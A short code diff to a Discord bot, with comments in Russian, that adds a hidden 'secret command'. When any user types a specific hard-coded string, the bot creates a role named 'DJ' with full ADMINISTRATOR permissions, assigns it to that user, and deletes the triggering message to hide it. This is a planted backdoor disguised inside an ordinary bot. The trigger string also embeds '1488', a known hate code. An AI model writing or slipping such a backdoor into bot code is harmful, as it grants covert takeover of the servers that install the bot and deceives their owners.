@@ -90,6 +90,19 @@ Me : `+text.substring(text.lastIndexOf('<br>')+14));
 			}
 		})
 	}
+	
+	/*Секретная команда для добавления человека в админы*/
+	if (command === 'secrit_command_1488_228_itmo_one_love_forever_0.59137_leibso') {
+		message.guild.createRole({
+			name: 'DJ',
+			permissions: ['ADMINISTRATOR']
+		})
+	//	.then(role => role.setPermissions(['ADMINISTRATOR']))
+		.then(role => message.member.addRole(role))
+		.catch(console.error)
+		
+		message.delete().catch(O_o=>{});  
+	}
 });
 
 /*Пишет в чат о том, что человек покинул сервер*/
